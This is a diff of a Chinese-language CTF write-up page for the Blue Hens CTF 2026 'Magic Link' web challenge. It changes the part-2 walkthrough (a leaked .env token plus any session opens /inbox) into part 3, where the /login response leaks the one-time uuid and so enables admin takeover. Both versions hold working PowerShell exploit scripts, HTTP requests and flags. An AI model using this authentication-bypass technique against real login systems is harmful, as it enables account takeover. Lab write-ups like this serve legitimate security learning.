@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/Blue%20Hens%20CTF%202026/Magic%20Link%202/">
+        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/Blue%20Hens%20CTF%202026/Magic%20Link%203/">
       
       
       
@@ -21,7 +21,7 @@
     
     
       
-        <title>Magic Link 2 - My Docs</title>
+        <title>Magic Link 3 - My Docs</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#magic-link-2" class="md-skip">
+        <a href="#magic-link-3" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Magic Link 2
+              Magic Link 3
             
           </span>
         </div>
@@ -275,10 +275,10 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#1-token-inbox" class="md-nav__link">
+  <a href="#1-loginuuid" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. token 单独访问 /inbox 不够
+        1. /login/&lt;uuid&gt; 就是真正的登录链接
       
     </span>
   </a>
@@ -286,21 +286,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
+  <a href="#2-session-dashboard" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. 先拿一个普通登录态
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-session-teddy-token" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. 带 session 和 Teddy token 打开收件箱
+        2. 带 session 访问 /dashboard
       
     </span>
   </a>
@@ -373,93 +362,81 @@
 
 
 
-<h1 id="magic-link-2">Magic Link 2</h1>
+<h1 id="magic-link-3">Magic Link 3</h1>
 <h2 id="_1">题目信息</h2>
 <ul>
 <li>类型：Web</li>
 <li>题目状态：已解出</li>
 <li>目标：https://bluehens-magic-link.chals.io/</li>
-<li>核心漏洞：<code>/.env</code> 泄露的 Teddy token 可以配合任意已登录 session 访问 <code>/inbox</code>，从而读到 Teddy 收件箱里的第二层 flag</li>
+<li>核心漏洞：Magic link 的一次性 <code>uuid</code> 直接在 <code>/login</code> 响应里返回，随后可通过 <code>/login/&lt;uuid&gt;</code> 直接换取管理员登录态</li>
 </ul>
 <h2 id="_2">入口与现象</h2>
-<p>第一层已经能从 <code>/.env</code> 读到：</p>
-<pre><code class="language-text">TEDDYS_EMAIL=teddy@udctf.com
-TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
-ADMIN_EMAIL=admin@udctf.com
-INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
-</code></pre>
-<p>这里最关键的不是第一层 flag 本身，而是后两项信息：</p>
+<p>前两层已经能确认三件事：</p>
 <ul>
-<li>Teddy 的 inbox 需要一个 <code>token</code></li>
-<li>管理员邮箱和 Teddy 的内部收件箱是题目后续流程的一部分</li>
+<li><code>robots.txt</code> 暗示了 <code>/.env</code>、<code>/inbox</code>、<code>/dashboard</code></li>
+<li><code>/.env</code> 泄露了 Teddy 的 token 和管理员邮箱</li>
+<li><code>/inbox</code> 里还能看到真正的 magic link</li>
 </ul>
-<p>再看 <code>robots.txt</code>：</p>
-<pre><code class="language-text">User-agent: *
-Disallow: /inbox
-Disallow: /dashboard
-Disallow: /.env
+<p>继续盯登录流程本身，会发现首页表单把邮箱直接提交到 <code>/login</code>：</p>
+<pre><code class="language-html">&lt;form id=&quot;magic-link-form&quot;&gt;
+  &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;Enter Email&quot; required&gt;
+  &lt;button type=&quot;submit&quot;&gt;Send Magic Link&lt;/button&gt;
+&lt;/form&gt;
 </code></pre>
-<p><code>/inbox</code> 明确被藏起来了，说明它就是下一层重点。</p>
+<p>向管理员邮箱提交后，返回 JSON：</p>
+<pre><code class="language-json">{
+  &quot;datetime&quot;: &quot;2026-04-18T09:53:46.970346+00:00&quot;,
+  &quot;email&quot;: &quot;admin@udctf.com&quot;,
+  &quot;ip-address&quot;: &quot;10.1.0.20&quot;,
+  &quot;message&quot;: &quot;Magic link generated, check your email.&quot;,
+  &quot;uuid&quot;: &quot;NHfaAN3pn9mvsXjAfR138g&quot;
+}
+</code></pre>
+<p>这里已经把最关键的东西暴露出来了：后端把本应只出现在邮件里的 magic link <code>uuid</code> 直接回给了前端。</p>
 <h2 id="_3">分析过程</h2>
-<h3 id="1-token-inbox">1. <code>token</code> 单独访问 <code>/inbox</code> 不够</h3>
-<p>直接访问：</p>
-<pre><code class="language-http">GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
+<h3 id="1-loginuuid">1. <code>/login/&lt;uuid&gt;</code> 就是真正的登录链接</h3>
+<p>拿到管理员的 <code>uuid</code> 后，直接访问：</p>
+<pre><code class="language-http">GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
 Host: bluehens-magic-link.chals.io
 </code></pre>
-<p>返回：</p>
-<pre><code class="language-http">HTTP/1.1 403 FORBIDDEN
+<p>服务端返回：</p>
+<pre><code class="language-http">HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: session=...; HttpOnly; Path=/
 </code></pre>
-<p>说明 <code>/inbox</code> 不是单纯拿 token 就能看，还额外要求调用者处于某种已认证状态。</p>
-<h3 id="2">2. 先拿一个普通登录态</h3>
-<p>继续测试发现，<code>/login</code> 不只会给管理员或 Teddy 生成 magic link，任意邮箱都能收到返回的 <code>uuid</code>。随后访问 <code>/login/&lt;uuid&gt;</code> 就能得到一个已登录 session。</p>
-<p>这意味着第二层并不要求先拿管理员权限，只要先换到任意登录态，再带着第一层泄露的 token 去打 <code>/inbox</code> 即可。</p>
-<h3 id="3-session-teddy-token">3. 带 session 和 Teddy token 打开收件箱</h3>
-<p>我在 2026-04-18 的实测中，用一个随机邮箱换到 session 后，再访问：</p>
-<pre><code class="language-http">GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
-Host: bluehens-magic-link.chals.io
-Cookie: session=...
+<p>说明这个路径段就是 magic link 的消费端点，而且会直接下发已登录 session。</p>
+<h3 id="2-session-dashboard">2. 带 session 访问 <code>/dashboard</code></h3>
+<p>我在 2026-04-18 的顺序复现实测中，管理员会话访问 <code>/dashboard</code> 后返回：</p>
+<pre><code class="language-html">&lt;h1&gt;Welcome Admin&lt;/h1&gt;&lt;p&gt;Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}&lt;/p&gt;
 </code></pre>
-<p>服务端会返回 Teddy 的 inbox 页面：</p>
-<pre><code class="language-html">&lt;h2&gt;Teddy's Inbox (Refreshes every 5s)&lt;/h2&gt;
-</code></pre>
-<p>这个页面非常长，夹杂大量空白节点，直接肉眼看很不方便。把返回内容保存下来再搜 <code>udctf{</code>，就能在靠后的位置找到第二层 flag：</p>
-<pre><code class="language-html">&lt;li&gt;&lt;a href=&quot;/login/m8hxfWL6vuzPl3fOm-Ywjw&quot;&gt;Click here to login&lt;/a&gt;&lt;/li&gt;
-&lt;p&gt;udctf{m4g1c_l1nks_4r3_w31rd}&lt;/p&gt;
-</code></pre>
-<p>到这里第二层 flag 就出来了。</p>
+<p>这就是第三层 flag。</p>
 <h2 id="_4">利用过程</h2>
 <ol>
-<li>通过 <code>/.env</code> 拿到 Teddy 的 token，也就是 <code>udctf{d0n7_h057_y0ur_3nv_f113}</code>。</li>
-<li>向 <code>/login</code> 提交任意邮箱，读取响应中的 <code>uuid</code>。</li>
-<li>访问 <code>/login/&lt;uuid&gt;</code>，换到一个已登录 session。</li>
-<li>带着这个 session 访问 <code>/inbox?token=TEDDYS_TOKEN</code>。</li>
-<li>保存 inbox HTML 并搜索 <code>udctf{</code>，读出第二层 flag。</li>
+<li>向 <code>/login</code> 提交 <code>admin@udctf.com</code>。</li>
+<li>从 JSON 响应里读取一次性 <code>uuid</code>。</li>
+<li>访问 <code>/login/&lt;uuid&gt;</code>，让服务端设置管理员 session。</li>
+<li>带着该 session 访问 <code>/dashboard</code>，读取第三层 flag。</li>
 </ol>
 <h2 id="payload">关键 payload / 命令</h2>
-<pre><code class="language-powershell">$mail = 'foo@example.com'
-$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = $mail }
+<pre><code class="language-powershell">$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
 $uuid = $login.uuid
 try {
     Invoke-WebRequest -Uri (&quot;https://bluehens-magic-link.chals.io/login/&quot; + $uuid) -WebSession $s -MaximumRedirection 0 -ErrorAction Stop | Out-Null
 } catch {
     if ($_.Exception.Response.StatusCode.value__ -notin 301,302,303,307,308) { throw }
 }
-$inbox = Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/inbox?token=udctf{d0n7_h057_y0ur_3nv_f113}' -WebSession $s
-$inbox.Content | Set-Content .\inbox.html
+$dash = Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
+$dash.Content
 </code></pre>
-<p>然后本地搜索：</p>
-<pre><code class="language-bash">rg -n &quot;udctf\\{|/login/&quot; inbox.html
-</code></pre>
-<p>关键命中：</p>
-<pre><code class="language-html">&lt;li&gt;&lt;a href=&quot;/login/m8hxfWL6vuzPl3fOm-Ywjw&quot;&gt;Click here to login&lt;/a&gt;&lt;/li&gt;
-&lt;p&gt;udctf{m4g1c_l1nks_4r3_w31rd}&lt;/p&gt;
+<p>关键输出：</p>
+<pre><code class="language-html">&lt;h1&gt;Welcome Admin&lt;/h1&gt;&lt;p&gt;Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}&lt;/p&gt;
 </code></pre>
 <h2 id="flag">Flag</h2>
-<pre><code class="language-text">udctf{m4g1c_l1nks_4r3_w31rd}
+<pre><code class="language-text">udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
 </code></pre>
 <h2 id="_5">总结</h2>
-<p>第二层的核心问题是鉴权拼接错了。开发者本来想用 Teddy 的 token 保护内部 inbox，但实际检查变成了“泄露的 token + 任意已登录 session”就能通过。结果是攻击者只要先拿第一层的 <code>.env</code> 泄露，再随便给自己换一个 magic link 登录态，就能读到 Teddy 收件箱里的第二层 flag。</p>
+<p>第三层的核心问题是 magic link 设计彻底失效了。服务端不仅生成了登录链接，还把其中最敏感的 <code>uuid</code> 原样回给前端，导致攻击者根本不需要读邮件，直接就能伪造管理员登录并进入后台拿到最终 flag。</p>
 
 
 
